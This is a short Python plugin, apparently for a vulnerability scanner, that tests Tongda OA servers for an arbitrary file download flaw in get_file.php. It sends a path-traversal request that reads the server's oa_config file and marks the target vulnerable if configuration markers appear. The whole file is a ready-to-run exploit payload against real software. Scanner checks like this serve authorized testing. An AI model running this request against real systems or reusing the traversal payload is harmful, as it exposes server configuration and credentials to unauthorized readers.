#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/mFOhsfwdh5A260a1ArMTiA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '通达OA get_file任意文件下载',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/16',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'ROOT_PATH=getenv.*?BACKUP_PATH',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret